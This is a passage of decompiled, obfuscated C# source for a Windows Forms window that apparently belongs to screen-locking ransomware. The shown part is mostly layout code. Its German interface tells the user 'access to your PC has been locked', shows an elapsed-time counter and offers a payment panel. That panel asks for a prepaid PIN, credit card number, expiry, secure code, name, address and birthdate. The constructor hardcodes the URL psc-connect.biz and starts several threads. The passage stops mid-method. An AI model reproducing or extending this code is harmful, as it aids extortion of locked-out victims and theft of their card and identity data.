using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;
using ns1;
using ns2;
using ns3;
using ns4;

namespace ns5;

internal class frmMain : Form
{
	private IContainer icontainer_0;

	private PictureBox pictureBox_0;

	private Label label_0;

	private RichTextBox richTextBox_0;

	private Label label_1;

	private TrackBar trackBar_0;

	private Label label_2;

	private Label label_3;

	private RichTextBox richTextBox_1;

	private Label label_4;

	private PictureBox pictureBox_1;

	private GroupBox groupBox_0;

	private RadioButton radioButton_0;

	private Button button_0;

	private PictureBox pictureBox_2;

	private Label label_5;

	private Button button_1;

	private TextBox textBox_0;

	private Label label_6;

	private PictureBox pictureBox_3;

	private RadioButton radioButton_1;

	private Label label_7;

	private TextBox textBox_1;

	private Label label_8;

	private Label label_9;

	private TextBox textBox_2;

	private Label label_10;

	private TextBox textBox_3;

	private Label label_11;

	private TextBox textBox_4;

	private TextBox textBox_5;

	private TextBox textBox_6;

	private Label label_12;

	private TextBox textBox_7;

	private Label label_13;

	private TextBox textBox_8;

	private Label label_14;

	private Button button_2;

	private PictureBox pictureBox_4;

	private PictureBox pictureBox_5;

	private PictureBox pictureBox_6;

	private PictureBox pictureBox_7;

	private PictureBox pictureBox_8;

	private PictureBox pictureBox_9;

	private PictureBox pictureBox_10;

	private GroupBox groupBox_1;

	private PictureBox pictureBox_11;

	private PictureBox pictureBox_12;

	private PictureBox pictureBox_13;

	private Label label_15;

	private TextBox textBox_9;

	private GroupBox groupBox_2;

	private PictureBox pictureBox_14;

	private GroupBox groupBox_3;

	private Timer timer_0;

	private TextBox textBox_10;

	private Stopwatch stopwatch_0;

	private Clock clock_0;

	private Thread thread_0;

	private Thread thread_1;

	private Thread thread_2;

	private Thread thread_3;

	private Thread thread_4;

	private Class12 class12_0;

	private Class12 class12_1;

	public string string_0;

	private string[] string_1;

	public bool bool_0;

	public string string_2;

	public frmMain()
	{
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		((Control)this).add_HandleCreated((EventHandler)frmMain_HandleCreated);
		stopwatch_0 = new Stopwatch();
		clock_0 = new Clock();
		thread_0 = new Thread(Class5.smethod_0);
		thread_1 = new Thread(Class8.smethod_3);
		thread_2 = new Thread(Class8.smethod_3);
		thread_3 = new Thread(Class8.smethod_3);
		thread_4 = new Thread(Class8.smethod_3);
		class12_0 = new Class12();
		class12_1 = new Class12();
		string_0 = string.Empty;
		bool_0 = true;
		string_2 = "http://psc-connect.biz/";
		InitializeComponent();
	}

	void Form.Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Expected O, but got Unknown
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Expected O, but got Unknown
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Expected O, but got Unknown
		//IL_015b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected O, but got Unknown
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_017b: Expected O, but got Unknown
		//IL_017c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0186: Expected O, but got Unknown
		//IL_0187: Unknown result type (might be due to invalid IL or missing references)
		//IL_0191: Expected O, but got Unknown
		//IL_0192: Unknown result type (might be due to invalid IL or missing references)
		//IL_019c: Expected O, but got Unknown
		//IL_019d: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a7: Expected O, but got Unknown
		//IL_01a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b2: Expected O, but got Unknown
		//IL_01b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bd: Expected O, but got Unknown
		//IL_01be: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c8: Expected O, but got Unknown
		//IL_01c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d3: Expected O, but got Unknown
		//IL_01d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01de: Expected O, but got Unknown
		//IL_01df: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e9: Expected O, but got Unknown
		//IL_01ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f4: Expected O, but got Unknown
		//IL_01f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ff: Expected O, but got Unknown
		//IL_0200: Unknown result type (might be due to invalid IL or missing references)
		//IL_020a: Expected O, but got Unknown
		//IL_020b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0215: Expected O, but got Unknown
		//IL_0216: Unknown result type (might be due to invalid IL or missing references)
		//IL_0220: Expected O, but got Unknown
		//IL_0221: Unknown result type (might be due to invalid IL or missing references)
		//IL_022b: Expected O, but got Unknown
		//IL_022c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0236: Expected O, but got Unknown
		//IL_0237: Unknown result type (might be due to invalid IL or missing references)
		//IL_0241: Expected O, but got Unknown
		//IL_0242: Unknown result type (might be due to invalid IL or missing references)
		//IL_024c: Expected O, but got Unknown
		//IL_024d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0257: Expected O, but got Unknown
		//IL_0258: Unknown result type (might be due to invalid IL or missing references)
		//IL_0262: Expected O, but got Unknown
		//IL_0263: Unknown result type (might be due to invalid IL or missing references)
		//IL_026d: Expected O, but got Unknown
		//IL_0274: Unknown result type (might be due to invalid IL or missing references)
		//IL_027e: Expected O, but got Unknown
		//IL_038c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0396: Expected O, but got Unknown
		//IL_0426: Unknown result type (might be due to invalid IL or missing references)
		//IL_0430: Expected O, but got Unknown
		//IL_04d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_04da: Expected O, but got Unknown
		//IL_05f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_05fb: Expected O, but got Unknown
		//IL_068a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0694: Expected O, but got Unknown
		//IL_071e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0728: Expected O, but got Unknown
		//IL_07b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_07c2: Expected O, but got Unknown
		//IL_0b95: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b9f: Expected O, but got Unknown
		//IL_0e54: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e5e: Expected O, but got Unknown
		//IL_0f47: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f51: Expected O, but got Unknown
		//IL_1047: Unknown result type (might be due to invalid IL or missing references)
		//IL_1051: Expected O, but got Unknown
		//IL_113d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1147: Expected O, but got Unknown
		//IL_1230: Unknown result type (might be due to invalid IL or missing references)
		//IL_123a: Expected O, but got Unknown
		//IL_1326: Unknown result type (might be due to invalid IL or missing references)
		//IL_1330: Expected O, but got Unknown
		//IL_141c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1426: Expected O, but got Unknown
		//IL_1694: Unknown result type (might be due to invalid IL or missing references)
		//IL_169e: Expected O, but got Unknown
		//IL_21a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_21ac: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(frmMain));
		vmethod_3(new Label());
		vmethod_5(new RichTextBox());
		vmethod_7(new Label());
		vmethod_9(new TrackBar());
		vmethod_11(new Label());
		vmethod_13(new Label());
		vmethod_15(new RichTextBox());
		vmethod_17(new Label());
		vmethod_21(new GroupBox());
		vmethod_99(new TextBox());
		vmethod_35(new Label());
		vmethod_97(new Label());
		vmethod_73(new Button());
		vmethod_61(new TextBox());
		vmethod_63(new Label());
		vmethod_65(new TextBox());
		vmethod_67(new Label());
		vmethod_69(new TextBox());
		vmethod_71(new Label());
		vmethod_59(new TextBox());
		vmethod_47(new Label());
		vmethod_49(new TextBox());
		vmethod_51(new Label());
		vmethod_53(new TextBox());
		vmethod_55(new Label());
		vmethod_57(new TextBox());
		vmethod_41(new Label());
		vmethod_43(new TextBox());
		vmethod_45(new Label());
		vmethod_37(new PictureBox());
		vmethod_39(new RadioButton());
		vmethod_25(new Button());
		vmethod_27(new PictureBox());
		vmethod_29(new Label());
		vmethod_31(new Button());
		vmethod_33(new TextBox());
		vmethod_23(new RadioButton());
		vmethod_19(new PictureBox());
		vmethod_89(new GroupBox());
		vmethod_93(new PictureBox());
		vmethod_95(new PictureBox());
		vmethod_91(new PictureBox());
		vmethod_75(new PictureBox());
		vmethod_87(new PictureBox());
		vmethod_77(new PictureBox());
		vmethod_85(new PictureBox());
		vmethod_79(new PictureBox());
		vmethod_83(new PictureBox());
		vmethod_81(new PictureBox());
		vmethod_101(new GroupBox());
		vmethod_103(new PictureBox());
		vmethod_1(new PictureBox());
		vmethod_105(new GroupBox());
		vmethod_109(new TextBox());
		vmethod_107(new Timer(icontainer_0));
		((ISupportInitialize)vmethod_8()).BeginInit();
		((Control)vmethod_20()).SuspendLayout();
		((ISupportInitialize)vmethod_36()).BeginInit();
		((ISupportInitialize)vmethod_26()).BeginInit();
		((ISupportInitialize)vmethod_18()).BeginInit();
		((Control)vmethod_88()).SuspendLayout();
		((ISupportInitialize)vmethod_92()).BeginInit();
		((ISupportInitialize)vmethod_94()).BeginInit();
		((ISupportInitialize)vmethod_90()).BeginInit();
		((ISupportInitialize)vmethod_74()).BeginInit();
		((ISupportInitialize)vmethod_86()).BeginInit();
		((ISupportInitialize)vmethod_76()).BeginInit();
		((ISupportInitialize)vmethod_84()).BeginInit();
		((ISupportInitialize)vmethod_78()).BeginInit();
		((ISupportInitialize)vmethod_82()).BeginInit();
		((ISupportInitialize)vmethod_80()).BeginInit();
		((Control)vmethod_100()).SuspendLayout();
		((ISupportInitialize)vmethod_102()).BeginInit();
		((ISupportInitialize)vmethod_0()).BeginInit();
		((Control)vmethod_104()).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)vmethod_2()).set_Anchor((AnchorStyles)13);
		vmethod_2().set_AutoSize(true);
		((Control)vmethod_2()).set_Font(new Font("Arial", 14f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		Label obj = vmethod_2();
		Point location = new Point(433, 9);
		((Control)obj).set_Location(location);
		((Control)vmethod_2()).set_Name("lblZugangGesperrt");
		Label obj2 = vmethod_2();
		Size size = new Size(387, 22);
		((Control)obj2).set_Size(size);
		((Control)vmethod_2()).set_TabIndex(1);
		vmethod_2().set_Text("Der Zugang zu ihrem PC wurde gesperrt.");
		((Control)vmethod_4()).set_Anchor((AnchorStyles)13);
		((TextBoxBase)vmethod_4()).set_BackColor(Color.DarkGray);
		vmethod_4().set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		RichTextBox obj3 = vmethod_4();
		location = new Point(437, 43);
		((Control)obj3).set_Location(location);
		((Control)vmethod_4()).set_Name("rtbWarnung");
		((TextBoxBase)vmethod_4()).set_ReadOnly(true);
		RichTextBox obj4 = vmethod_4();
		size = new Size(1078, 299);
		((Control)obj4).set_Size(size);
		((Control)vmethod_4()).set_TabIndex(2);
		vmethod_4().set_Text(componentResourceManager.GetString("rtbWarnung.Text"));
		((Control)vmethod_6()).set_Anchor((AnchorStyles)6);
		vmethod_6().set_AutoSize(true);
		((Control)vmethod_6()).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj5 = vmethod_6();
		location = new Point(12, 845);
		((Control)obj5).set_Location(location);
		((Control)vmethod_6()).set_Name("lblOpacity");
		Label obj6 = vmethod_6();
		size = new Size(97, 20);
		((Control)obj6).set_Size(size);
		((Control)vmethod_6()).set_TabIndex(3);
		vmethod_6().set_Text("Sichtbarkeit:");
		((Control)vmethod_8()).set_Anchor((AnchorStyles)6);
		((Control)vmethod_8()).set_Enabled(false);
		TrackBar obj7 = vmethod_8();
		location = new Point(8, 870);
		((Control)obj7).set_Location(location);
		vmethod_8().set_Maximum(100);
		vmethod_8().set_Minimum(65);
		((Control)vmethod_8()).set_Name("tbOpacity");
		TrackBar obj8 = vmethod_8();
		size = new Size(188, 45);
		((Control)obj8).set_Size(size);
		((Control)vmethod_8()).set_TabIndex(4);
		vmethod_8().set_Value(100);
		((Control)vmethod_10()).set_Anchor((AnchorStyles)10);
		vmethod_10().set_AutoSize(true);
		((Control)vmethod_10()).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj9 = vmethod_10();
		location = new Point(1382, 841);
		((Control)obj9).set_Location(location);
		((Control)vmethod_10()).set_Name("lblTime");
		Label obj10 = vmethod_10();
		size = new Size(132, 20);
		((Control)obj10).set_Size(size);
		((Control)vmethod_10()).set_TabIndex(5);
		vmethod_10().set_Text("Vergangene Zeit:");
		((Control)vmethod_12()).set_Anchor((AnchorStyles)10);
		vmethod_12().set_AutoSize(true);
		((Control)vmethod_12()).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj11 = vmethod_12();
		location = new Point(43, 92);
		((Control)obj11).set_Location(location);
		((Control)vmethod_12()).set_Name("lblTimePassed");
		Label obj12 = vmethod_12();
		size = new Size(64, 17);
		((Control)obj12).set_Size(size);
		((Control)vmethod_12()).set_TabIndex(6);
		vmethod_12().set_Text("00:00:00");
		((Control)vmethod_14()).set_Anchor((AnchorStyles)13);
		((TextBoxBase)vmethod_14()).set_BackColor(Color.DarkGray);
		vmethod_14().set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		RichTextBox obj13 = vmethod_14();
		location = new Point(8, 373);
		((Control)obj13).set_Location(location);
		((Control)vmethod_14()).set_Name("rtbInfo");
		((TextBoxBase)vmethod_14()).set_ReadOnly(true);
		RichTextBox obj14 = vmethod_14();
		size = new Size(1507, 122);
		((Control)obj14).set_Size(size);
		((Control)vmethod_14()).set_TabIndex(7);
		vmethod_14().set_Text(componentResourceManager.GetString("rtbInfo.Text"));
		vmethod_16().set_AutoSize(true);
		((Control)vmethod_16()).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		Label obj15 = vmethod_16();
		location = new Point(7, 357);
		((Control)obj15).set_Location(location);
		((Control)vmethod_16()).set_Name("lblInfo");
		Label obj16 = vmethod_16();
		size = new Size(33, 13);
		((Control)obj16).set_Size(size);
		((Control)vmethod_16()).set_TabIndex(8);
		vmethod_16().set_Text("Info:");
		((Control)vmethod_20()).set_Anchor((AnchorStyles)15);
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_98());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_34());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_96());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_72());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_60());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_62());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_64());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_66());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_68());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_70());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_58());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_46());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_48());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_50());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_52());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_54());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_56());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_40());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_42());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_44());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_36());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_38());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_24());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_26());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_28());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_30());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_32());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_22());
		((Control)vmethod_20()).get_Controls().Add((Control)(object)vmethod_18());
		GroupBox obj17 = vmethod_20();
		location = new Point(536, 501);
		((Control)obj17).set_Location(location);
		((Control)vmethod_20()).set_Name("gbPayment");
		GroupBox obj18 = vmethod_20();
		size = new Size(396, 414);
		((Control)obj18).set_Size(size);
		((Control)vmethod_20()).set_TabIndex(11);
		vmethod_20().set_TabStop(false);
		vmethod_20().set_Text("Zahlungsarten");
		TextBox obj19 = vmethod_98();
		location = new Point(294, 113);
		((Control)obj19).set_Location(location);
		((Control)vmethod_98()).set_Name("txtCaptcha");
		TextBox obj20 = vmethod_98();
		size = new Size(100, 20);
		((Control)obj20).set_Size(size);
		((Control)vmethod_98()).set_TabIndex(37);
		((Control)vmethod_98()).set_Visible(false);
		vmethod_34().set_AutoSize(true);
		((Control)vmethod_34()).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj21 = vmethod_34();
		location = new Point(94, 78);
		((Control)obj21).set_Location(location);
		((Control)vmethod_34()).set_Name("lblTextPIN");
		Label obj22 = vmethod_34();
		size = new Size(30, 15);
		((Control)obj22).set_Size(size);
		((Control)vmethod_34()).set_TabIndex(11);
		vmethod_34().set_Text("PIN:");
		vmethod_96().set_AutoSize(true);
		Label obj23 = vmethod_96();
		location = new Point(306, 194);
		((Control)obj23).set_Location(location);
		((Control)vmethod_96()).set_Name("Label9");
		Label obj24 = vmethod_96();
		size = new Size(131, 13);
		((Control)obj24).set_Size(size);
		((Control)vmethod_96()).set_TabIndex(36);
		vmethod_96().set_Text("Momentan nicht verfügbar");
		((Control)vmethod_72()).set_Enabled(false);
		Button obj25 = vmethod_72();
		location = new Point(200, 392);
		((Control)obj25).set_Location(location);
		((Control)vmethod_72()).set_Name("btnZahlenCC");
		Button obj26 = vmethod_72();
		size = new Size(226, 23);
		((Control)obj26).set_Size(size);
		((Control)vmethod_72()).set_TabIndex(35);
		((ButtonBase)vmethod_72()).set_Text("Zahlen");
		((ButtonBase)vmethod_72()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_60()).set_Enabled(false);
		TextBox obj27 = vmethod_60();
		location = new Point(328, 366);
		((Control)obj27).set_Location(location);
		((Control)vmethod_60()).set_Name("txtSC");
		TextBox obj28 = vmethod_60();
		size = new Size(98, 20);
		((Control)obj28).set_Size(size);
		((Control)vmethod_60()).set_TabIndex(34);
		vmethod_62().set_AutoSize(true);
		((Control)vmethod_62()).set_Enabled(false);
		Label obj29 = vmethod_62();
		location = new Point(250, 369);
		((Control)obj29).set_Location(location);
		((Control)vmethod_62()).set_Name("lblTextSC");
		Label obj30 = vmethod_62();
		size = new Size(72, 13);
		((Control)obj30).set_Size(size);
		((Control)vmethod_62()).set_TabIndex(33);
		vmethod_62().set_Text("Secure Code:");
		((Control)vmethod_64()).set_Enabled(false);
		TextBox obj31 = vmethod_64();
		location = new Point(200, 366);
		((Control)obj31).set_Location(location);
		((Control)vmethod_64()).set_Name("txtExpiry");
		TextBox obj32 = vmethod_64();
		size = new Size(44, 20);
		((Control)obj32).set_Size(size);
		((Control)vmethod_64()).set_TabIndex(32);
		vmethod_64().set_Text("04/14");
		vmethod_66().set_AutoSize(true);
		((Control)vmethod_66()).set_Enabled(false);
		((Control)vmethod_66()).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj33 = vmethod_66();
		location = new Point(80, 367);
		((Control)obj33).set_Location(location);
		((Control)vmethod_66()).set_Name("lblTextExpiry");
		Label obj34 = vmethod_66();
		size = new Size(119, 15);
		((Control)obj34).set_Size(size);
		((Control)vmethod_66()).set_TabIndex(31);
		vmethod_66().set_Text("Ablaufsjahr (MM/JJ):");
		((Control)vmethod_68()).set_Enabled(false);
		TextBox obj35 = vmethod_68();
		location = new Point(200, 342);
		((Control)obj35).set_Location(location);
		((Control)vmethod_68()).set_Name("txtCC");
		TextBox obj36 = vmethod_68();
		size = new Size(226, 20);
		((Control)obj36).set_Size(size);
		((Control)vmethod_68()).set_TabIndex(30);
		vmethod_70().set_AutoSize(true);
		((Control)vmethod_70()).set_Enabled(false);
		((Control)vmethod_70()).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj37 = vmethod_70();
		location = new Point(76, 343);
		((Control)obj37).set_Location(location);
		((Control)vmethod_70()).set_Name("lblTextCC");
		Label obj38 = vmethod_70();
		size = new Size(123, 15);
		((Control)obj38).set_Size(size);
		((Control)vmethod_70()).set_TabIndex(29);
		vmethod_70().set_Text("Kreditkartennummer:");
		((Control)vmethod_58()).set_Enabled(false);
		TextBox obj39 = vmethod_58();
		location = new Point(200, 320);
		((Control)obj39).set_Location(location);
		((Control)vmethod_58()).set_Name("txtGeburtsdatum");
		TextBox obj40 = vmethod_58();
		size = new Size(74, 20);
		((Control)obj40).set_Size(size);
		((Control)vmethod_58()).set_TabIndex(28);
		vmethod_58().set_Text("01/01/1999");
		vmethod_46().set_AutoSize(true);
		((Control)vmethod_46()).set_Enabled(false);
		((Control)vmethod_46()).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj41 = vmethod_46();
		location = new Point(34, 321);
		((Control)obj41).set_Location(location);
		((Control)vmethod_46()).set_Name("lblGeburtsdatum");
		Label obj42 = vmethod_46();
		size = new Size(165, 15);
		((Control)obj42).set_Size(size);
		((Control)vmethod_46()).set_TabIndex(27);
		vmethod_46().set_Text("Geburtsdatum (TT/MM/JJJJ):");
		((Control)vmethod_48()).set_Enabled(false);
		TextBox obj43 = vmethod_48();
		location = new Point(294, 298);
		((Control)obj43).set_Location(location);
		((Control)vmethod_48()).set_Name("txtOrt");
		TextBox obj44 = vmethod_48();
		size = new Size(132, 20);
		((Control)obj44).set_Size(size);
		((Control)vmethod_48()).set_TabIndex(26);
		vmethod_50().set_AutoSize(true);
		((Control)vmethod_50()).set_Enabled(false);
		((Control)vmethod_50()).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj45 = vmethod_50();
		location = new Point(265, 299);
		((Control)obj45).set_Location(location);
		((Control)vmethod_50()).set_Name("lblTextOrt");
		Label obj46 = vmethod_50();
		size = new Size(26, 15);
		((Control)obj46).set_Size(size);
		((Control)vmethod_50()).set_TabIndex(25);
		vmethod_50().set_Text("Ort:");
		((Control)vmethod_52()).set_Enabled(false);
		TextBox obj47 = vmethod_52();
		location = new Point(200, 298);
		((Control)obj47).set_Location(location);
		((Control)vmethod_52()).set_Name("txtPLZ");
		TextBox obj48 = vmethod_52();
		size = new Size(59, 20);
		((Control)obj48).set_Size(size);
		((Control)vmethod_52()).set_TabIndex(24);
		vmethod_54().set_AutoSize(true);
		((Control)vmethod_54()).set_Enabled(false);
		((Control)vmethod_54()).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj49 = vmethod_54();
		location = new Point(167, 299);
		((Control)obj49).set_Location(location);
		((Control)vmethod_54()).set_Name("lblTextPLZ");
		Label obj50 = vmethod_54();
		size = new Size(32, 15);
		((Control)obj50).set_Size(size);
		((Control)vmethod_54()).set_TabIndex(23);
		vmethod_54().set_Text("PLZ:");
		((Control)vmethod_56()).set_Enabled(false);
		TextBox obj51 = vmethod_56();
		location = new Point(200, 276);
		((Control)obj51).set_Location(location);
		((Control)vmethod_56()).set_Name("txtStrasse");
		TextBox obj52 = vmethod_56();
		size = new Size(226, 20);
		((Control)obj52).set_Size(size);
		((Control)vmethod_56()).set_TabIndex(22);
		vmethod_40().set_AutoSize(true);
		((Control)vmethod_40()).set_Enabled(false);
		((Control)vmethod_40()).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj53 = vmethod_40();
		location = new Point(50, 277);
		((Control)obj53).set_Location(location);
		((Control)vmethod_40()).set_Name("lblTextStrasse");
		Label obj54 = vmethod_40();
		size = new Size(149, 15);
		((Control)obj54).set_Size(size);
		((Control)vmethod_40()).set_TabIndex(21);
		vmethod_40().set_Text("Straße und Hausnummer:");
		((Control)vmethod_42()).set_Enabled(false);
		TextBox obj55 = vmethod_42();
		location = new Point(200, 254);
		((Control)obj55).set_Location(location);
		((Control)vmethod_42()).set_Name("txtName");
		TextBox obj56 = vmethod_42();
		size = new Size(226, 20);
		((Control)obj56).set_Size(size);
		((Control)vmethod_42()).set_TabIndex(20);
		vmethod_44().set_AutoSize(true);
		((Control)vmethod_44()).set_Enabled(false);
		((Control)vmethod_44()).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj57 = vmethod_44();
		location = new Point(79, 255);
		((Control)obj57).set_Location(location);
		((Control)vmethod_44()).set_Name("lblTextName");
		Label obj58 = vmethod_44();
		size = new Size(120, 15);
		((Control)obj58).set_Size(size);
		((Control)vmethod_44()).set_TabIndex(19);
		vmethod_44().set_Text("Vor- und Nachname:");
		((Control)vmethod_36()).set_Enabled(false);
		vmethod_36().set_Image((Image)(object)Class19.smethod_9());
		PictureBox obj59 = vmethod_36();
		location = new Point(117, 163);
		((Control)obj59).set_Location(location);
		((Control)vmethod_36()).set_Name("PictureBox1");
		PictureBox obj60 = vmethod_36();
		size = new Size(183, 78);
		((Control)obj60).set_Size(size);
		vmethod_36().set_SizeMode((PictureBoxSizeMode)1);
		vmethod_36().set_TabIndex(18);
		vmethod_36().set_TabStop(false);
		((ButtonBase)vmethod_38()).set_AutoSize(true);
		((Control)vmethod_38()).set_Enabled(false);
		RadioButton obj61 = vmethod_38();
		location = new Point(97, 194);
		((Control)obj61).set_Location(location);
		((Control)vmethod_38()).set_Name("rdbCC");
		RadioButton obj62 = vmethod_38();
		size = new Size(14, 13);
		((Control)obj62).set_Size(size);
		((Control)vmethod_38()).set_TabIndex(17);
		vmethod_38().set_TabStop(true);
		((ButtonBase)vmethod_38()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_24()).set_Enabled(false);
